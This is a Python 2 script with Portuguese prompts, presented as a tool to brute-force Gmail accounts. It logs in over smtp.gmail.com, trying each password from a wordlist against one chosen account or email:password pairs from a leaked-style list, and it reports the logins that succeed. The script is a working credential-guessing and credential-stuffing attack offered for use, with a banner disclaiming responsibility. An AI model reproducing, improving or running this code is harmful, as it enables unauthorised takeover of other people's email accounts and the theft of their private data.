 #!usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import time
import sys
import os
cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
normal = '\033[0;0m'
purpleClaro= '\033[1;35m'
amarelo= '\033[1;33m'
ciano='\033[46m'
magenta='\033[45m'
normal = '\033[0;0m'
os.system('clear')

BannerOld = """
───────────────────────────────────────────────────────────────────────
─██████████████─██████──────────██████─██████████████─██████████─██████
─██░░░░░░░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██
─██░░██████████─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─████░░████─██░░██
─██░░██─────────██░░██████░░██████░░██─██░░██──██░░██───██░░██───██░░██
─██░░██─────────██░░██──██░░██──██░░██─██░░██████░░██───██░░██───██░░██
─██░░██──██████─██░░██──██░░██──██░░██─██░░░░░░░░░░██───██░░██───██░░██
─██░░██──██░░██─██░░██──██████──██░░██─██░░██████░░██───██░░██───██░░██
─██░░██──██░░██─██░░██──────────██░░██─██░░██──██░░██───██░░██───██░░██
─██░░██████░░██─██░░██──────────██░░██─██░░██──██░░██─████░░████─██░░██████████
─██░░░░░░░░░░██─██░░██──────────██░░██─██░░██──██░░██─██░░░░░░██─██░░░░░░░░░░██
─██████████████─██████──────────██████─██████──██████─██████████─██████████████
────────────────────────────────────────────────────────────────────────────────
─────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──██████─██████──────────██████─██████─────────██████████████─██████████████─██████──████████─
─██░░██──██░░██─██░░██████████──██░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─
─██░░██──██░░██─██░░░░░░░░░░██──██░░██─██░░██─────────██░░██████░░██─██░░██████████─██░░██──██░░████─
─██░░██──██░░██─██░░██████░░██──██░░██─██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██───
─██░░██──██░░██─██░░██──██░░██──██░░██─██░░██─────────██░░██──██░░██─██░░██─────────██░░██████░░██───
─██░░██──██░░██─██░░██──██░░██──██░░██─██░░██─────────██░░██──██░░██─██░░██─────────██░░░░░░░░░░██───
─██░░██──██░░██─██░░██──██░░██──██░░██─██░░██─────────██░░██──██░░██─██░░██─────────██░░██████░░██───
─██░░██──██░░██─██░░██──██░░██████░░██─██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██───
─██░░██████░░██─██░░██──██░░░░░░░░░░██─██░░██████████─██░░██████░░██─██░░██████████─██░░██──██░░████─
─██░░░░░░░░░░██─██░░██──██████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─
─██████████████─██████──────────██████─██████████████─██████████████─██████████████─██████──████████─
─────────────────────────────────────────────────────────────────────────────────────────────────────\n
"""
BannerNew =""".....................................,.OOD8D88888...........,.............,,,,,,,,,,,,
....................................OZODDDOD8D888O.........................,,,,,,,,,,,.,,,,,,,......
.................................Z887DDDDDDD88D888..........................,,,,,,,.,,.,,,,,,.......
...............................ZDDNNONNDDDNDD88888O.................................,,.,,,,.........
............................$O8DDDDNDNDDDNDDDD88DOO8...................................,,...........
..........................7O8DDDDDDDNNDD8DDDDDDDDD8O................................................
.........................O$88DDDDDDDDNNDDNNDNDDDDD888...............................................
 .    ..................=$8Z8DDDDDDDDDNNDNNNNNNDDDD8DD...,.OO.......................................
     .....   ...7........~O88DDDDDDDDDDNNNNNNNNDDDDDDDN..O88O.......................................
         .   .,78$,........$O888DDDDDNDNNNNNNNNNNNNNNNDD8888Z.....................$,................      ▒█▀▀█ ▒█▀▄▀█ ░█▀▀█ ▀█▀ ▒█░░░
             .~7O$......~+..O888DDDDDDDDNNNNNNNNNNNNNNDDD8O:.............,$OI....$OZ=...............      ▒█░▄▄ ▒█▒█▒█ ▒█▄▄█ ▒█░ ▒█░░░
     .....   .=$8$. ...=ZO7..O8DD8DDDDDDNNNNNNNNNNNNNDD888...............I7O7....78O?...............      ▒█▄▄█ ▒█░░▒█ ▒█░▒█ ▄█▄ ▒█▄▄█
     .Z8,.   .IO8O.....?ZZ$...O?D8DDDDDNDNNDDNNNNNNDDD88ND8..............,$O$+...$887...............
     :$8O    .ZO8Z....=$OZ?....O8$8DDDDDDDDNN8NNNNDD88?.=8DDDDO...........IZO$...IDD8,.......OO7.... █░░█ ▒█▄░▒█ ▒█░░░ ▒█▀▀▀█ ▒█▀▀█ ▒█░▄▀ ▒█▀▀▀ ▒█▀▀▄ 
     .$88.   .O88Z:..:IO8Z......O88DDDDDDDNNNDDDDDDD888O.ODDDDDI?.........7Z8Z7..:DD8I......~ZOI.... █░░█ ▒█▒█▒█ ▒█░░░ ▒█░░▒█ ▒█░░░ ▒█▀▄░ ▒█▀▀▀ ▒█░▒█ 
     .7DD7   .88DO=..?7OO$.......O88DDDDDDDNDNDDDDDOD=.OO$ODNDODZ8.........$OOZ...D88$......$OOI.... ░▀▀▀ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄█ ▒█▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█▄▄▀ 
     .?O88.. .8DNO...7Z8Z+   ....?O8D8DDDDDD8DDDDDZO8DDDDZ$ODDDDDD.........7Z8OZ..8DD$......O8O+....
     .,$DDO. .O8D8..?Z8OZ.  ..=NNNN8888DD88DDD8DD8DND8.OOZ$$DNDDN+.........+$888?.8DD8I....ZOO$..... +================================================+
      .=8D8...8888.:IO8Z.   .INNNNNDD88888DDDNDDDD~DDI88O$7$ONNNN8..........$Z88O.DDD8Z....ZOO7..... |           BruteForce Gmail Acounts             |  
      .=$888.7DD8NZ?$OZ$.   .7$DNNDD8OOODDNOO888DDD8DODNDO77$DNNDD:..........$O887ODDD7...Z88Z?..... +================================================+
      ..I8DD888O$77O$8Z.     .$Z$$ZZODDOONND?IO8DZ887$D8D8Z7Z8DDND8..........,O8D8NDNDD7.:O8OI...... | ♚ Coded: łuŧЋ1єr ルシアー                      |
       .+Z8OODD87ZZ7I8OZO. .     ..8.?D+N~DD8~ODOZOODNZZZ88$$ODNDD?O......O88OOD8888DDD88DD8Z?...... | ♚ Date: 21/12/2016                             |
       .=$888DD8Z8OI?+OD8O=   .  .?D.ZNNDDOOO$ODNO$DOOZ.8OZZ$ODNZN8D8....Z88DZIO88D88DD888D87~...... | ♚ Chanell:telegram.me/Phantasm_Lab             |
       .+$O888DDDD87IZ888ZZ...O8DDDD88DNNNNDOOZ8D8O8O8DZO7OZ$NDDNONND....ZZ88O7ZO8D88DD8888O7=...... | ♚ Changing the Description of this tool        |
       :+$8888888O8D$DDOZZ.=$I8DNNNNNDNNNNNNN88888NDOZO8OD8O8D8NONNN8D8=OD$O8D$O88DD8888888OI+...... |   Won't made you the coder ^_^ !!!             |
     ..~+Z8888D8D$Z=OD8OZ788DONNNNNNNNNDNNNNNDDD88D888NNDDDDDND8DDNDN88DDNNZDD$=DDDD88O8888OI+...... | ♚ Respect Coderz ^_^(Open_Source_Project)      |
     ..~+O88DD8D$OI?8DOOONNODDDNNNNNNDDNNNNNNNNNNNND88O8DNDNNNDNN8NNN8NNNNNZ8D87ND8D888O8OOO7+...... | ♚ I take no responsibilities for the           |
     ..~?O88D8DI?+?$O8OOOZDNNDD8NNNNNDONNNNNNNNNNNNNNNNNNNNDNDNNND8DNNNNMND$?O7$88DDDDD88OOO7+...... |   use of this program !                        |
     ..:?ZO888+==+?7IO$ODN8NDNDD8DNDNDD8NNNNNNNNNNNNNNNNNNNNNNNNNNDDNN8NNN8Z?7Z?O7O8NDDDD88O7+...... | ♚ Contact: @Xcultevil (Telegram)               |
     .Z??77OOI~~=OOI$OZZI8DDODNDDDDNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNDNNNNNZO88$?D7ZZZ8DDD88O$=:..... +================================================+
     .IZ+?IZ$~++?D?$88OO7ODNODDNNDNNNNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNNDNNDNNZO8O7?O7?+I788D8OO$=I~.... |           BruteForce Gmail Acounts             |
     .:7DNZ$8III7O8$7Z8?IDDDNNN8NDNNNNNNNNNNNNNNNNNNNNNNMNNNNMNNN8NNNNNNNNDZOZ$7I$7??I?Z8O$7ID?O,.   +================================================+
     ..ZO$DNNDO$7$ZOO$?IID7OD8NDNNDNNNNNNNNMNNDDNNNNNNMDNNNNNNDN88NDNDNDNNNONZZ$OO$$$7IZOZ7$O?+8=...
      .:.Z$Z8DNDDDND?+I7ID$$N8DNNNNNNNNDNNNNDD888NNN8D88O8NNNNN888NNNNMNNNNNDDDNZZ$$ZZONNDO7DIOO$...
         ..7==OOOOO=8?ZDDD$$N8NNDNNNNNNNNNNN888OOD8NNNNNNNDDDNN88NNNNMNNNNNN8NDD88?$8?O87,,,78$7?...
          .=D==~=8ND?Z8ODIZDDDN8DNNNNNNDNNNNOODZZ8NNNNNNNNND8Z88O8OZNNMNNNNNND8D888OZO7Z$888OO$O....
             .=$87Z+D7?7DNNNDDNNDNNNNNNNDNNDNOZZZDNNNNNNNNNO8D7$DZOZNNMNNNNDNDDN888O8Z8O888OO$$$..
               ..,DDNNNNNN8D8DNNNNNNNNNNNNNNN$O8$NNNNNNNNNNMD8IZZ$ZDNNMNNNNNNDDNDDZ8OOO8ZZZO$?:.
                   8NNNNNND8ODN8NNNNNNNNNNDNNZZZ8NNNNND8DNNNN$8$7$NDNNNNNNNNNNDDDDDDOOOOZOZZO.
                    ...II.  ,O88NNDDDNO8NNMNNI8ODNDNN8O8DNDNND$IOODMDNDNNNNNNNDDO888DDDDDDD.
                     .       .ZZNN8D8NNDNDMND87NODONNZN88N8N88ZOIZNDNND8MNNO88DD+.7I7$7.
                     .       ..$DNONDNMN$NNND$ODDN8ND8DD8N8DDD88?NDDD8DDNNDZ8$O....
         
Use this Help Options >> python2 GmailUnlocked.py -h or '--help'                    """
print verde+BannerNew
#print BannerOld
OlderZ ="""                                 +============================================+
                                 | ☤ [1] Testar Usando Uma Lista de Senhas!.. |
                                 +--------------------------------------------+
                                 | ☤ [2] Lista Com Emails e Senhas.. 🔫        |
                                 +============================================+"""

def help():
   #print (cyanClaro+ Audio)
   #print (amarelo+Videos) 
   print(verde+'Modo de uso:')
   print(verde+'$ python2 GmailUnlocked.py\n')
   print(verde+'Example > [1] email > Wordlist.txt')
   print(verde+'Example > [2] Phantasm_Lab@gmail.com:PhantasmLab')
   print('')
   print amarelo + 'NOTA > Na opção 2 as listas de emails e senhas deveram conter o seguinte separador ":" \nComo podemos ver no Exemplo há cima....'
print(' ')
try:
  xxx = sys.argv[1]
  if xxx == '-h' or opt == '--help':
    help()
except:
  print ('')
print vermelho+OlderZ

options = raw_input(cyanClaro+ "♛ Escolha uma das alternativas para Prosseguir: ")
print('')
def Mzt():
  try:
    try:
      smptserver = smtplib.SMTP("smtp.gmail.com", 587)
      smptserver.ehlo()
      smptserver.starttls()
      user = raw_input(cyanClaro + "💉  Enter for your Username or Email >>> ")
      print('')
      passwfile = raw_input(verde + "💉  Digite o nome de sua wordlist: ")
      print('')

      passwfile = open(passwfile, "r")

      for password in passwfile:
        try:
            smptserver.login(user, password)
            print verde + "[+] Password Found: %s" % password, "[+] Email: %s" % user, "\n"
            break;
        except smtplib.SMTPAuthenticationError:   
            print vermelho + "[!] Password Incorrect: %s" % password
      time.sleep(1)
    except:
      print vermelho + "[404] Wordlist Incorreta![;/]"  
  except KeyboardInterrupt:
    print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"
def Suck(): 
  smptserver = smtplib.SMTP("smtp.gmail.com", 587)
  smptserver.ehlo()
  smptserver.starttls()
  try:
    WordList = raw_input(azul + "💉 Digite o Nome da sua Wordlist.txt: ")
    print('')
    var = open(WordList, 'r').readlines()
    for line in var:
      line = line.strip()
      USERNAME, PASSWORD = line.split(":")
      try:
        smptserver.login(USERNAME, PASSWORD)
        print verde +"[+] Login Activated: %s" % line, "\n"
        print('')
        break;
      except smtplib.SMTPAuthenticationError:
        print vermelho + "[!] password Incorrect: %s" % line,"\n"
  except KeyboardInterrupt:
    print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"      
if options == '1':
  Mzt() 
elif options == '2':
  Suck()
else:
  print vermelho + "Escolha uma opção Valida..[!/.]"
